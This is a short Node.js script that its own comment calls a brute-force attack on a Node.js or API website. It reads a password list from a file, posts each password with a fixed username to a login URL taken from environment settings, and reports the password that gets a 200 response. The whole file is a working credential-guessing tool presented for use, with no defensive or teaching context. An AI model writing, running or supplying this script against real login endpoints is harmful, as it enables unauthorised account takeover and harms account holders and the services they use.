import { readFile } from 'fs/promises';
import fetch from 'node-fetch';
import dotenv from 'dotenv';
dotenv.config();

const raw = await readFile(process.env.FILE_ATTACK, 'utf-8');
const data = JSON.parse(raw);

const url = process.env.URL_ATTACK;
const username = process.env.USERNAME_ATTACK;

// Brut-force Attack for NODE.JS or API website / app
for (let i = 0; i < data.length; i++) {
    const password = data[i];
    console.log(`Trying: ${password}`);

    try {
        const res = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({username, password}),
        });

        if (res.ok || res.status === 200) {
            console.log('😈 Correct password found:', password);
            break;
        } else {
            console.log(i, ') Password failed with:', password);
        }

        await new Promise(r => setTimeout(r, 200));
    } catch (err) {
        console.error('🤬 Error:', err);
    }
}